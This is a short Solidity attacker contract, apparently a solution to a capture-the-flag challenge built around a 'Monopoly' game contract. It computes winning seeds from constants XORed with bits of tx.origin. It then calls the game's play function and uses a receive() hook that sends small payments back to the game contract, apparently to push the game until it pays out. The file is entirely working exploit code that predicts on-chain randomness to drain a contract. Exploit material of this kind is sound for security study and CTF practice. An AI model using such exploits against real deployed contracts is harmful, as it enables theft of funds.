pragma solidity 0.8.7;

import "./Setup.sol";

contract tneroAttacker {

    Monopoly instance;

    function getSeeds() public view returns (uint16 s1, uint16 s2) {
        s1 = uint16(151) ^ uint16(bytes2(bytes20(address(tx.origin))));
        s2 = uint16(331) ^ uint16(bytes2(bytes20(address(tx.origin))));
    }

     function attack(Monopoly inst) public payable {
        require(msg.value >= 0.25 ether);
        instance = inst;
        (uint16 s1, uint16 s2) = getSeeds();
        instance.play{value: msg.value}(s1, s2);
    }

    receive() external payable {
        if(msg.value < 1 ether) {
            payable(address(instance)).call{value: msg.value}("");
        }
    }

}